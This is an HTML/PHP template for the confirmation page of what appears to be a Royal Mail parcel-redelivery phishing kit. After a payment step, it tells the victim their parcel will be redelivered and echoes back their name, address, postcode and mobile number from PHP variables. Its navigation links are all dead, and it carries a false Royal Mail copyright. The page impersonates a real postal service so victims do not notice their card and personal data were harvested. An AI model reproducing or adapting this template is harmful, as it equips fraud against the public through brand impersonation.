                    </header>
                </div>
                <main class="jss11">
                    <div class="MuiContainer-root jss371 MuiContainer-maxWidthLg">
                        <div class="jss372">
                            <div class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-3">
                                <div class="MuiGrid-root jss374 MuiGrid-item MuiGrid-grid-sm-12 MuiGrid-grid-md-8">
                                    <div class="MuiTabs-root jss375">
                                        <div class="MuiTabs-scroller MuiTabs-fixed" style="overflow: hidden;">
                                            <div class="MuiTabs-flexContainer">
                                                <button class="MuiButtonBase-root MuiTab-root jss376 MuiTab-textColorInherit" type="button"> <span class="MuiTab-wrapper"> <div class="MuiPaper-root jss377 jss381 MuiPaper-elevation0"> <span class="jss378"> <span class="hideMobile">1. Your item</span> <svg height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg" class="MuiSvgIcon-root jss379" focusable="false" icon="CheckCircle"> <path d="m23 11.1v.9c0 6.1-4.9 11-11 11-6.1 0-11-4.9-11-11s4.9-11 11-11c1.5 0 3.1.3 4.5 1 .5.2.7.8.5 1.3s-.8.7-1.3.5c-1.2-.5-2.4-.8-3.7-.8-5 0-9 4-9 9s4 9 9 9c5 0 9-4 9-9v-.9c0-.6.4-1 1-1s1 .4 1 1zm.7-8.8c-.4-.4-1-.4-1.4 0l-10.3 10.3-2.3-2.3c-.4-.4-1-.4-1.4 0s-.4 1 0 1.4l3 3c.2.2.5.3.7.3s.5-.1.7-.3l11-11c.4-.4.4-1 0-1.4z" ></path> </svg> </span> </div></span> </button>
                                                <button class="MuiButtonBase-root MuiTab-root jss376 MuiTab-textColorInherit" type="button"> <span class="MuiTab-wrapper"> <div class="MuiPaper-root jss377 jss381 MuiPaper-elevation0"> <span class="jss378"> <span class="hideMobile">2. Destination</span> <svg height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg" class="MuiSvgIcon-root jss379" focusable="false" icon="CheckCircle"> <path d="m23 11.1v.9c0 6.1-4.9 11-11 11-6.1 0-11-4.9-11-11s4.9-11 11-11c1.5 0 3.1.3 4.5 1 .5.2.7.8.5 1.3s-.8.7-1.3.5c-1.2-.5-2.4-.8-3.7-.8-5 0-9 4-9 9s4 9 9 9c5 0 9-4 9-9v-.9c0-.6.4-1 1-1s1 .4 1 1zm.7-8.8c-.4-.4-1-.4-1.4 0l-10.3 10.3-2.3-2.3c-.4-.4-1-.4-1.4 0s-.4 1 0 1.4l3 3c.2.2.5.3.7.3s.5-.1.7-.3l11-11c.4-.4.4-1 0-1.4z" ></path> </svg> </span> </div></span> </button>
                                                <button class="MuiButtonBase-root MuiTab-root jss376 MuiTab-textColorInherit" type="button"> <span class="MuiTab-wrapper"> <div class="MuiPaper-root jss377 jss381 MuiPaper-elevation0"> <span class="jss378"> <span class="hideMobile">3. Payment</span> <svg height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg" class="MuiSvgIcon-root jss379" focusable="false" icon="CheckCircle"> <path d="m23 11.1v.9c0 6.1-4.9 11-11 11-6.1 0-11-4.9-11-11s4.9-11 11-11c1.5 0 3.1.3 4.5 1 .5.2.7.8.5 1.3s-.8.7-1.3.5c-1.2-.5-2.4-.8-3.7-.8-5 0-9 4-9 9s4 9 9 9c5 0 9-4 9-9v-.9c0-.6.4-1 1-1s1 .4 1 1zm.7-8.8c-.4-.4-1-.4-1.4 0l-10.3 10.3-2.3-2.3c-.4-.4-1-.4-1.4 0s-.4 1 0 1.4l3 3c.2.2.5.3.7.3s.5-.1.7-.3l11-11c.4-.4.4-1 0-1.4z" ></path> </svg> </span> </div></span> </button>
												<button class="MuiButtonBase-root MuiTab-root jss376 MuiTab-textColorInherit Mui-selected jss382" type="button" id="activeStep"> <span class="MuiTab-wrapper"> <div class="MuiPaper-root jss377 jss382 MuiPaper-elevation0"><span class="jss378">4. Confirmation</span></div></span> </button>
                                            </div>
                                            <span class="jss385 jss387 MuiTabs-indicator jss380" style="left: 613px; width: 200.333px;"></span>
                                        </div>
                                    </div>
                                    <form action="#" method="post">
                                        <div class="jss10740">
                                            <div class="MuiPaper-root MuiCard-root MuiPaper-elevation0">
                                                <div class="MuiCardHeader-root">
                                                    <div class="MuiCardHeader-content">
                                                        <span class="MuiTypography-root MuiCardHeader-title MuiTypography-h1 MuiTypography-displayBlock">Confirmation</span>
                                                    </div>
                                                </div>
												<div class="MuiCardHeader-root" style="padding-top:0px;">
                                                    <div>
														<p class="MuiTypography-root jss18712 MuiTypography-body1">Your parcel <b>JA449772842GB</b> has been scheduled to be redelivered. It will arrive at its destination on <b><?=date('d-m-Y', strtotime('+3 days'));?></b>.</p>
														<br>
														<p class="MuiTypography-root jss18712 MuiTypography-body1">You can now safely close this page.</p>
														<p class="MuiTypography-root jss18712 MuiTypography-body1">Thank you.</p>
													</div>
                                                </div>
												
                                                
                                            </div>
                                        </div>
                                    </form>
                                </div>
                                <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-sm-12 MuiGrid-grid-md-4">
                                    <div class="jss11725">
                                        <div class="jss11673"><p class="MuiTypography-root MuiTypography-h3">Your postage</p></div>
                                        <div class="jss11674">
                                            <div class="jss11690">
                                                <svg width="24" height="24" viewBox="0 0 24 24" class="MuiSvgIcon-root jss11691" focusable="false" icon="QueensHead">
                                                    <path
                                                        d="M19.4,22.087a5.558,5.558,0,0,1-3.632,1.74,12,12,0,0,1-5.522-.873c-1.5-.536-3.011-1.075-4.611-1.64.238-.345.484-.759.76-1.132.555-.732,1.118-1.45,1.684-2.181.056-.069.111-.166.194-.18,1.339-.262,1.435-1.449,1.836-2.416a6.838,6.838,0,0,0,.179-.787c-.3.069-.524.11-.759.166A1.6,1.6,0,0,1,7.26,13.39a.963.963,0,0,0-.079-.263c-.525-1.063-.511-1.132.47-1.85-.18-.373-.387-.345-.8-.289-1.19.151-1.67.593-1.312,1.836.111.386-.238.773-.873.787a1.449,1.449,0,0,0,.263-1.587c-.079-.332.166-.745.29-1.215-.238-.124-.47-.013-.622.4a2.567,2.567,0,0,1-.427.842c-.138.151-.428.166-.745.262a9.532,9.532,0,0,0,.607-1.021,1.2,1.2,0,0,1,1.409-.934,1.208,1.208,0,0,1,.424.176c.263.111.773.263.829.166.3-.455-.221-.511-.456-.714a3.978,3.978,0,0,1-.828-3.606C6,5.037,6.652,3.712,7.37,2.428A5.3,5.3,0,0,1,11.884.533c.555.138.994.263,1.312-.4.207.238.358.415.524.608.207-.152.414-.276.731-.511.055.47.1.842.152,1.284,1.214-.69,2.278-.248,3.327.442,1.118.732,1.146,1.547.041,2.264a12.988,12.988,0,0,1,.677,1.712c.138.511.1,1.063.193,1.573a3.111,3.111,0,0,0,.415,1.118,14.037,14.037,0,0,0,1.076,1.146c.125.138.277.373.238.511a.624.624,0,0,1-.469.4c-.525.028-.387.3-.387.649a7.476,7.476,0,0,1-.207,1.45c-.028.179-.138.331-.166.511-.069.787-.345,1.063-1.159,1.132-.5.041-1.008.1-1.508.11-.565.014-.8.345-.911.856-.207,1.008-.414,2.016-.662,3.024-.1.358.013.511.3.7,1.049.731,2.071,1.518,3.094,2.278C18.8,21.618,19.063,21.825,19.4,22.087Z"
                                                    ></path>
                                                </svg>
                                                <div>
                                                    <p class="MuiTypography-root jss11693 jss11694 MuiTypography-body1">1 - 10kg Medium parcel</p>
                                                    <p class="MuiTypography-root jss11693 jss11695 MuiTypography-body1">Royal Mail 2nd Class</p>
                                                    <ul class="MuiList-root jss11693 jss11696 MuiList-padding">
                                                        <li class="MuiTypography-root MuiTypography-body1">1-3 business days</li>
                                                        <li class="MuiTypography-root MuiTypography-body1">Compensation up to £250</li>
                                                    </ul>
                                                </div>
                                                <div><p class="MuiTypography-root jss11693 jss11697 MuiTypography-body1">£2.99</p></div>
                                            </div>
                                        </div>
                                        <div class="jss11677 jss11678">
                                            <div class="jss11700"><p class="MuiTypography-root jss11701 MuiTypography-body1">To:</p></div>
                                            <div>
                                                <p class="MuiTypography-root MuiTypography-body1"><?=$fullname;?></p>
                                                <p class="MuiTypography-root MuiTypography-body1"><?=$address;?></p>
                                                <p class="MuiTypography-root MuiTypography-body1"><?=$town;?></p>
                                                <p class="MuiTypography-root MuiTypography-body1"><?=$postcode;?></p>
                                                <p class="MuiTypography-root MuiTypography-body1">United Kingdom</p>
                                                <p class="MuiTypography-root MuiTypography-body1"><?=$mobile;?></p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </main>
                <footer class="jss197">
                    <div class="jss198">
                        <div class="MuiContainer-root jss200 MuiContainer-maxWidthLg">
                            <div class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-1">
                                <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-12 MuiGrid-grid-sm-6">
                                    <div class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-1">
                                        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-12"><h6 class="MuiTypography-root jss201 MuiTypography-h6">Royal Mail</h6></div>
                                        <div class="MuiGrid-root jss204 MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-12">
                                            <div class="jss205">
                                                <svg viewBox="0 0 131.39 86.9" focusable="false" class="jss206">
                                                    <g style="opacity: 0;"><rect width="131.39" height="86.9" style="fill: rgb(255, 255, 255);"></rect></g>
                                                    <rect x="48.37" y="15.14" width="34.66" height="56.61" style="fill: rgb(255, 95, 0);"></rect>
                                                    <path d="M51.94,43.45a35.94,35.94,0,0,1,13.75-28.3,36,36,0,1,0,0,56.61A35.94,35.94,0,0,1,51.94,43.45Z" transform="translate(0 0)" style="fill: rgb(235, 0, 27);"></path>
                                                    <path
                                                        d="M120.5,65.76V64.6h.5v-.24h-1.19v.24h.47v1.16Zm2.31,0v-1.4h-.36l-.42,1-.42-1h-.36v1.4h.26V64.7l.39.91h.27l.39-.91v1.06Z"
                                                        transform="translate(0 0)"
                                                        style="fill: rgb(247, 158, 27);"
                                                    ></path>
                                                    <path d="M123.94,43.45a36,36,0,0,1-58.25,28.3,36,36,0,0,0,0-56.61,36,36,0,0,1,58.25,28.3Z" transform="translate(0 0)" style="fill: rgb(247, 158, 27);"></path>
                                                </svg>
                                            </div>
                                            <div class="jss205">
                                                <svg height="15" viewBox="0 0 69.62 22.49" width="44" focusable="false" class="jss206">
                                                    <path
                                                        d="M53.1,28.1,44,49.85H38L33.56,32.49a2.39,2.39,0,0,0-1.34-1.91,23.73,23.73,0,0,0-5.55-1.85l.14-.63h9.57A2.61,2.61,0,0,1,39,30.32L41.34,42.9l5.85-14.8H53.1M76.4,42.74c0-5.73-7.93-6-7.88-8.61,0-.78.76-1.61,2.39-1.82a10.55,10.55,0,0,1,5.55,1l1-4.61a15.11,15.11,0,0,0-5.26-1c-5.56,0-9.47,2.95-9.5,7.18,0,3.13,2.79,4.88,4.92,5.92s2.92,1.75,2.92,2.71c0,1.46-1.75,2.09-3.37,2.12a11.71,11.71,0,0,1-5.78-1.37l-1,4.77a17.24,17.24,0,0,0,6.26,1.15c5.91,0,9.78-2.92,9.79-7.45m14.69,7.11h5.2L91.75,28.1H87a2.58,2.58,0,0,0-2.4,1.59L76.12,49.85H82l1.17-3.25h7.22Zm-6.28-7.71,3-8.16,1.71,8.16Zm-23.67-14L56.49,49.85H50.86L55.52,28.1Z"
                                                        transform="translate(-26.67 -27.71)"
                                                        fill="#2a2a6c"
                                                    ></path>
                                                </svg>
                                            </div>
                                            <div class="jss205">
                                                <svg height="13" viewBox="0 0 48 13" width="48" focusable="false" class="jss206">
                                                    <g fill="none">
                                                        <path
                                                            d="m5.66908673.00053721h-3.67467339c-.25133276-.00015842-.46538054.18265981-.5045355.43092393l-1.48620362 9.42283186c-.01382747.08848985.01177261.1785982.07005988.2466s.14342022.107082.23298381.1069513h1.75432206c.25150683.0001167.46561815-.1829838.5045355-.43146147l.40083438-2.54148341c.03888584-.24827657.25269492-.43131355.5039982-.43146114h1.1632794c2.42058834 0 3.81759825-1.17133908 4.18243276-3.49252479.16441732-1.01551874.00698505-1.81342633-.46853563-2.37223029-.52226679-.61360974-1.44859182-.93814599-2.67849785-.93814599zm.42393877 3.44148029c-.2009545 1.31856243-1.20841357 1.31856243-2.18255933 1.31856243h-.55450547l.38901353-2.46249862c.02352777-.14883534.15182289-.25844684.30250637-.25844684h.25414834c.66357971 0 1.28954762 0 1.61300914.3782673.19289483.22567083.2519991.56095321.17838742 1.02411573zm10.5603203-.04244761h-1.7596952c-.1506834.00000235-.2789786.1096115-.3025063.25844684l-.0779102.49217734-.1230443-.17838742c-.3809539-.55289354-1.2304434-.7377287-2.0783209-.7377287-1.9445304 0-3.60536024 1.47277083-3.92882176 3.53873357-.1681785 1.03056347.07092512 2.01599277.65552003 2.70321418.53623689.6318783 1.30351773.895161 2.21640993.895161 1.5668004 0 2.4356331-1.0074591 2.4356331-1.0074591l-.0784475.48895347c-.0141468.08847177.0111563.17870163.0692428.24691713.0580865.0682154.1431307.1075749.2327263.1077085h1.5850689c.2515068.000117.4656182-.1829835.5045355-.43146118l.9510414-6.02272466c.0141666-.08827776-.0110888-.17832781-.0690953-.24636389-.0580064-.06803608-.1429292-.10721472-.2323365-.10718708zm-2.452827 3.42482354c-.1697904 1.00530982-.967698 1.68017307-1.985366 1.68017307-.5109833 0-.91934-.16388001-1.181548-.47444606-.2600588-.3084168-.3589241-.7474003-.2761781-1.23635377.1585069-.99671284.9698472-1.69360586 1.9719332-1.69360586.4996997 0 .9059072.16602925 1.1734883.47928186.2681185.31647647.3745061.75814653.2976706 1.24495076zm11.8246143-3.42482462h-1.7682922c-.1693077.00026909-.3275621.0841218-.4228641.22405998l-2.4388569 3.59246472-1.0337874-3.45222642c-.0651566-.21619213-.2642308-.3641881-.4900281-.36429828h-1.7376654c-.0989663-.00026209-.1919603.04731301-.2496549.12772284s-.0729781.18374274-.0410306.27741112l1.9477542 5.71591979-1.8311576 2.58500564c-.0663431.0934347-.0749765.2160888-.0223762.3178958.0526002.1018069.1576335.165685.272226.165685h1.766143c.1673828.0002301.3242198-.0817027.4196402-.2192235l5.8814118-8.48952181c.0649734-.09361527.0725999-.21556292.0197965-.3165439-.0528035-.10098097-.157305-.16435098-.2712583-.16435098z"
                                                            fill="#253b80"
                                                        ></path>
                                                        <path
                                                            d="m31.8796793.00053731h-3.6752107c-.2511293.00010595-.464875.18286075-.5039982.43092383l-1.4862037 9.42283186c-.0139894.08833751.0114042.178371.0694907.2463797s.14304.1071713.2324784.1071713h1.8859634c.1757727-.0002577.3252516-.1283173.3524763-.30196909l.4217896-2.67097549c.0388858-.24827657.2526949-.43131355.5039982-.43146114h1.1627421c2.4211256 0 3.8175982-1.17133908 4.18297-3.49252479.1649547-1.01551874.0064478-1.81342633-.4690729-2.37223029-.5217295-.61360974-1.4475172-.93814589-2.6774232-.93814589zm.4239387 3.44148019c-.2004172 1.31856243-1.2078762 1.31856243-2.1825593 1.31856243h-.5539682l.3895509-2.46249862c.0230744-.14886977.1513218-.25863311.301969-.25844707h.2541484c.6630424 0 1.2895476 0 1.6130091.37826753.1928949.22567083.2514618.56095321.1778501 1.02411573zm10.559783-.04244761h-1.7586205c-.1507314-.00041462-.2791073.1094587-.3019691.25844684l-.0779102.49217734-.1235816-.17838742c-.3809539-.55289354-1.229906-.7377287-2.0777836-.7377287-1.9445303 0-3.6048229 1.47277083-3.9282844 3.53873357-.1676412 1.03056347.0703878 2.01599277.6549827 2.70321418.5373115.6318783 1.3035177.895161 2.21641.895161 1.5668003 0 2.435633-1.0074591 2.435633-1.0074591l-.0784474.48895347c-.0141766.08865721.0112633.17906983.0695913.24732613.0583281.0682562.143669.1074806.2334523.1072995h1.5845317c.2513033-.0001476.4651123-.1831846.5039982-.43146118l.9515786-6.02272466c.0136512-.08854922-.0120865-.17864136-.0704539-.24661612s-.1435318-.10703948-.2331271-.10693485zm-2.452827 3.42482354c-.1687158 1.00530982-.967698 1.68017307-1.985366 1.68017307-.5099086 0-.91934-.16388001-1.181548-.47444606-.2600588-.3084168-.3578495-.7474003-.2761781-1.23635377.1595815-.99671284.9698473-1.69360586 1.9719332-1.69360586.4996997 0 .9059072.16602925 1.1734883.47928186.2691931.31647647.3755808.75814653.2976706 1.24495076zm4.5273868-6.56540928-1.5082334 9.59530885c-.0139895.08833751.0114042.178371.0694906.2463797.0580865.0680087.1430401.1071713.2324784.1071713h1.5162931c.2519991 0 .4658491-.1826859.5045355-.43146117l1.4872782-9.42229455c.0139725-.08838818-.0114107-.17846613-.0694769-.24655443s-.1430065-.10737549-.2324921-.10753385h-1.6979044c-.1505703.00053315-.2785009.11025302-.301969.25898415z"
                                                            fill="#179bd7"
                                                        ></path>
                                                    </g>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-12 MuiGrid-grid-sm-6">
                                    <div class="MuiGrid-root jss202 MuiGrid-container MuiGrid-spacing-xs-1">
                                        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-6">
                                            <p class="MuiTypography-root MuiTypography-body2">
                                                <a class="MuiButtonBase-root MuiButton-root MuiButton-text jss203 MuiButton-textSecondary" href="javascript:void(0);"> <span class="MuiButton-label">Terms of use</span> </a>
                                            </p>
                                        </div>
                                        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-6">
                                            <p class="MuiTypography-root MuiTypography-body2">
                                                <a class="MuiButtonBase-root MuiButton-root MuiButton-text jss203 MuiButton-textSecondary" href="javascript:void(0);"> <span class="MuiButton-label">Privacy policy</span> </a>
                                            </p>
                                        </div>
                                        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-6">
                                            <p class="MuiTypography-root MuiTypography-body2">
                                                <a class="MuiButtonBase-root MuiButton-root MuiButton-text jss203 MuiButton-textSecondary" href="javascript:void(0);"> <span class="MuiButton-label">Cookie policy</span> </a>
                                            </p>
                                        </div>
                                        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-6">
                                            <p class="MuiTypography-root MuiTypography-body2">
                                                <a class="MuiButtonBase-root MuiButton-root MuiButton-text jss203 MuiButton-textSecondary" href="javascript:void(0);"> <span class="MuiButton-label">Terms &amp; conditions</span> </a>
                                            </p>
                                        </div>
                                        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-6">
                                            <p class="MuiTypography-root MuiTypography-body2">
                                                <a class="MuiButtonBase-root MuiButton-root MuiButton-text jss203 MuiButton-textSecondary" href="javascript:void(0);"> <span class="MuiButton-label">Give feedback</span> </a>
                                            </p>
                                        </div>
                                        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-12 MuiGrid-grid-md-6">
                                            <p class="MuiTypography-root MuiTypography-body2">
                                                <button class="MuiButtonBase-root MuiButton-root MuiButton-text jss203 MuiButton-textSecondary" type="button"><span class="MuiButton-label">Update cookie preferences</span></button>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                                <div class="MuiGrid-root MuiGrid-container MuiGrid-direction-xs-column">
                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-12 MuiGrid-grid-sm-12"><hr class="MuiDivider-root jss210" /></div>
                                </div>
                                <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-12 MuiGrid-grid-sm-6"><h6 class="MuiTypography-root jss201 MuiTypography-h6">Related pages</h6></div>
                                <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-3">
                                    <div class="MuiGrid-root MuiGrid-item">
                                        <p class="MuiTypography-root MuiTypography-body2">
                                            <a class="MuiButtonBase-root MuiButton-root MuiButton-text jss203 MuiButton-textSecondary" href="javascript:void(0);"> <span class="MuiButton-label">Click &amp; Drop</span> </a>
                                        </p>
                                    </div>
                                </div>
                                <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-3">
                                    <div class="MuiGrid-root MuiGrid-item">
                                        <p class="MuiTypography-root MuiTypography-body2">
                                            <a class="MuiButtonBase-root MuiButton-root MuiButton-text jss203 MuiButton-textSecondary" href="javascript:void(0);"> <span class="MuiButton-label">Mobile app</span> </a>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="jss199">
                        <div class="MuiContainer-root jss200 MuiContainer-maxWidthLg">
                            <div class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2">
                                <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-12 MuiGrid-grid-md-6">
                                    <a class="MuiButtonBase-root MuiButton-root MuiButton-text jss203 jss208 MuiButton-textSecondary" href="javascript:void(0);">
                                        <span class="MuiButton-label">
                                            <div class="jss209">
                                                <svg height="24" viewBox="0 0 24 24" width="24" class="MuiSvgIcon-root jss42" focusable="false" icon="Instagram">
                                                    <path
                                                        d="m17 1h-10c-3.3 0-6 2.7-6 6v10c0 3.3 2.7 6 6 6h10c3.3 0 6-2.7 6-6v-10c0-3.3-2.7-6-6-6zm4 16c0 2.2-1.8 4-4 4h-10c-2.2 0-4-1.8-4-4v-10c0-2.2 1.8-4 4-4h10c2.2 0 4 1.8 4 4zm-8.2-10c-.5-.1-1-.1-1.5 0-2.7.4-4.6 3-4.2 5.7.4 2.5 2.5 4.3 4.9 4.3.2 0 .5 0 .7-.1 1.3-.2 2.5-.9 3.3-2s1.1-2.4.9-3.7c-.2-2.2-1.9-3.9-4.1-4.2zm1.7 6.7c-.5.6-1.2 1.1-2 1.2-1.6.2-3.2-.9-3.4-2.5-.3-1.6.9-3.2 2.5-3.4h.4.4c1.3.2 2.3 1.2 2.5 2.5.2.8 0 1.6-.4 2.2zm3.9-7.6c0 .1.1.2.1.4 0 .3-.1.5-.3.7s-.5.3-.7.3-.5-.1-.7-.3-.3-.5-.3-.7c0-.1 0-.3.1-.4 0-.1.1-.2.2-.3.4-.4 1-.4 1.4 0 .1.1.2.2.2.3z"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </span>
                                    </a>
                                    <a class="MuiButtonBase-root MuiButton-root MuiButton-text jss203 jss208 MuiButton-textSecondary" href="javascript:void(0);">
                                        <span class="MuiButton-label">
                                            <div class="jss209">
                                                <svg height="24" viewBox="0 0 24 24" width="24" class="MuiSvgIcon-root jss42" focusable="false" icon="Linkedin">
                                                    <path
                                                        d="m6.12103226 8.0776129c.1960129 0 .35483871.15889678.35483871.35483871v14.18843869c0 .1960129-.15882581.3548387-.35483871.3548387h-4.41653549c-.1960129 0-.35483871-.1588258-.35483871-.3548387v-14.18843869c0-.19594193.15882581-.35483871.35483871-.35483871zm11.23376774-.35263871c4.9744839 0 5.6452 3.59586451 5.6452 7.11338061v7.7826065c0 .1960129-.1588258.3548387-.3548387.3548387h-4.4085161c-.1960129 0-.3548387-.1588258-.3548387-.3548387l-.0005317-7.0899428c-.0108196-1.8367159-.2020481-3.2172701-1.9380942-3.2172701-1.6490064 0-2.2915483.9215871-2.2915483 3.2871548v7.0199871c0 .1960129-.1588258.3549097-.3548388.3549097h-4.40688382c-.19601291 0-.35483871-.1588968-.35483871-.3549097v-14.18843869c0-.19594193.1588258-.35483871.35483871-.35483871h4.22960642c.1960129 0 .3548387.15889678.3548387.35483871v.92151613c.7953355-.86644516 2.1066065-1.62899355 3.8804452-1.62899355zm-13.44043871-6.70077419c1.60571613 0 2.91209032 1.30594839 2.91201936 2.91116774 0 1.60585807-1.30630323 2.9123742-2.91201936 2.9123742-1.60699355 0-2.91436129-1.30644517-2.91436129-2.9123742 0-1.60521935 1.30736774-2.91116774 2.91436129-2.91116774z"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </span>
                                    </a>
                                    <a class="MuiButtonBase-root MuiButton-root MuiButton-text jss203 jss208 MuiButton-textSecondary" href="javascript:void(0);">
                                        <span class="MuiButton-label">
                                            <div class="jss209">
                                                <svg height="24" viewBox="0 0 24 24" width="24" class="MuiSvgIcon-root jss42" focusable="false" icon="Facebook2">
                                                    <path
                                                        d="m20.0353805 1h-16.07081477c-1.63725186 0-2.96456573 1.32725031-2.96456573 2.96454397v16.07080443c0 1.6372937 1.32726005 2.9646516 2.96456573 2.9646516h7.92604917l.0135083-7.8616789h-2.04244775c-.26543048 0-.48086402-.2146247-.48188656-.4800532l-.00979488-2.5341106c-.00102255-.2668816.21505681-.4837667.48194038-.4837667h2.03873431v-2.44859436c0-2.8415707 1.7354697-4.38882746 4.2703524-4.38882746h2.0800665c.2661301 0 .4819404.21575486.4819404.48193684v2.13677506c0 .26607434-.2156488.48177539-.4816713.48193684l-1.2765097.000592c-1.3785486 0-1.645486.65506815-1.645486 1.61641242v2.11982246h3.0291474c.288626 0 .5125628.252028.4785498.5386607l-.3003583 2.5341106c-.0287389.2425022-.2343775.425213-.4785499.425213h-2.7152806l-.0135084 7.8615713h4.7161271c1.6372518 0 2.9645119-1.3272503 2.9645119-2.9644902v-16.07096583c0-1.63729366-1.3273139-2.96454397-2.9646195-2.96454397z"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </span>
                                    </a>
                                    <a class="MuiButtonBase-root MuiButton-root MuiButton-text jss203 jss208 MuiButton-textSecondary" href="javascript:void(0);">
                                        <span class="MuiButton-label">
                                            <div class="jss209">
                                                <svg height="24" viewBox="0 0 24 24" width="24" class="MuiSvgIcon-root jss42" focusable="false" icon="Twitter">
                                                    <path
                                                        d="m23.5748992 2.18881297c-.2993577-.2011288-.7982872-.2011288-1.0976448 0-.6985013.502822-1.4967884.90507961-2.2950755 1.20677281-1.9957179-1.81015922-5.0890805-1.91072362-7.1845842 0-1.2972166 1.00564401-1.9957178 2.51411003-1.9957178 4.12314045-2.89379087-.2011288-5.48822404-1.70959482-7.1845842-4.12314045-.19957178-.3016932-.49892945-.4022576-.89807302-.4022576-.39914356 0-.69850124.3016932-.79828713.6033864-.09978589.10056441-1.0976448 2.51411003-.99785891 5.43047767.09978589 2.51411005 1.0976448 5.73217085 4.78972278 8.04515205-1.49678837.7039509-3.19314852 1.0056441-4.88950867 1.0056441-.39914356 0-.89807302.3016932-.99785891.7039508s.09978589.9050796.49892945 1.1062084c2.49464728 1.4079016 5.18886635 2.1118524 7.68351363 2.1118524s4.88950868-.6033864 7.08479828-1.9107236c4.2907933-2.4135457 6.6856547-7.0395081 6.6856547-12.57055017 0-.2011288 0-.3016932 0-.50282201.9978589-1.10620841 1.6963602-2.41354562 1.9957178-3.82144724.0997859-.40225761-.0997859-.80451521-.3991435-1.00564401zm-3.3927203 3.82144724c-.1995718.2011288-.2993577.60338641-.2993577.90507961.0997859.20112881.0997859.40225761.0997859.60338641 0 4.82709127-2.0955037 8.74910287-5.6877958 10.86095537-2.794005 1.6090304-6.08693938 2.011288-9.37987379 1.2067728 1.29721658-.4022576 2.49464728-.9050796 3.59229208-1.7095948.39914357-.2011289.49892946-.5028221.49892946-.9050797s-.29935767-.7039508-.59871535-.8045152c-5.78758169-2.6146744-5.58800991-7.54233006-4.98929456-10.05644009 2.19528961 2.21241683 5.28865224 3.51975404 8.58158666 3.41918964.4989294 0 .9978589-.502822.9978589-1.00564401v-1.00564401c0-1.00564401.3991436-2.01128802 1.1974307-2.71523883 1.3970025-1.30733722 3.692078-1.10620841 4.8895087.3016932.2993576.30169321.6985012.40225761.9978589.30169321.1995718-.10056441.4989294-.10056441.6985012-.20112881-.1995718.30169321-.3991435.50282201-.5987153.80451521z"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </span>
                                    </a>
                                </div>
                                <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-12 MuiGrid-grid-md-6">
                                    <div class="jss211"><p class="MuiTypography-root jss212 MuiTypography-body1">© Royal Mail Group Ltd 2023. All rights reserved</p></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </footer>
                <div class="MuiDrawer-root MuiDrawer-docked jss213">
                    <div class="MuiPaper-root MuiDrawer-paper jss214 MuiDrawer-paperAnchorLeft MuiDrawer-paperAnchorDockedLeft MuiPaper-elevation0" style="visibility: hidden; transform: translateX(0px);">
                        <div>
                            <div class="jss215"></div>
                            <div class=""></div>
                            <ul class="MuiList-root jss217 MuiList-padding">
                                <div class="MuiButtonBase-root MuiListItem-root jss219 MuiListItem-gutters MuiListItem-divider MuiListItem-button">
                                    <div class="MuiListItemText-root"><p class="MuiTypography-root jss218 MuiTypography-body1">Send an item now</p></div>
                                </div>
                                <div class="MuiButtonBase-root MuiListItem-root jss219 MuiListItem-gutters MuiListItem-divider MuiListItem-button">
                                    <div class="MuiListItemText-root"><p class="MuiTypography-root jss218 MuiTypography-body1">Arrange a collection</p></div>
                                </div>
                                <div class="MuiButtonBase-root MuiListItem-root jss219 MuiListItem-gutters MuiListItem-divider MuiListItem-button">
                                    <div class="MuiListItemText-root"><p class="MuiTypography-root jss218 MuiTypography-body1">Help &amp; support</p></div>
                                </div>
                                <div class="MuiButtonBase-root MuiListItem-root jss231 MuiListItem-gutters MuiListItem-button">
                                    <p class="MuiTypography-root jss218 MuiTypography-body1">Other services</p>
                                    <svg height="24" viewBox="0 0 24 24" width="24" class="MuiSvgIcon-root jss42" focusable="false" icon="ChevronDown">
                                        <path d="m18.7 9.7-6 6c-.2.2-.4.3-.7.3s-.5-.1-.7-.3l-6-6c-.4-.4-.4-1 0-1.4s1-.4 1.4 0l5.3 5.3 5.3-5.3c.4-.4 1-.4 1.4 0s.4 1 0 1.4z"></path>
                                    </svg>
                                </div>
                            </ul>
                        </div>
                        <ul class="MuiList-root jss220 MuiList-padding">
                            <hr class="MuiDivider-root" />
